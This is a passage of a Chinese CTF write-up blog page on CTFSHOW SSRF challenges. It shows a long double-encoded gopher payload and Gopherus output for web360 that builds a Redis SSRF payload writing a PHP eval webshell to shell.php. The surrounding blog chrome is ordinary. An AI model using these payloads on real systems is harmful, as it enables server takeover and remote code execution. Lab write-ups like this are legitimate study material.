class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">31</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p>提示打 redis，想打 fastcgi 打不通。。。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ python2 gopherus.py --exploit redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]); ?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher <span class="built_in">link</span> is Ready to get PHP Shell:</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br><span class="line">When it<span class="string">&#x27;s done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------Made-by-SpyD3r-----------</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web351"><span class="toc-number">1.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web352-353"><span class="toc-number">2.</span> <span class="toc-text">web352-353</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web354"><span class="toc-number">3.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web355-356"><span class="toc-number">4.</span> <span class="toc-text">web355-356</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web357"><span class="toc-number">5.</span> <span class="toc-text">web357</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web358"><span class="toc-number">6.</span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web359"><span class="toc-number">7.</span> <span class="toc-text">web359</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web360"><span class="toc-number">8.</span> <span class="toc-text">web360</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&text=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&is_video=false&description=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 SSRF篇&body=Check out this article: https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&name=Practice - CTFSHOW WEB入门 SSRF篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&t=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    b_y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'recharging-runtime';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
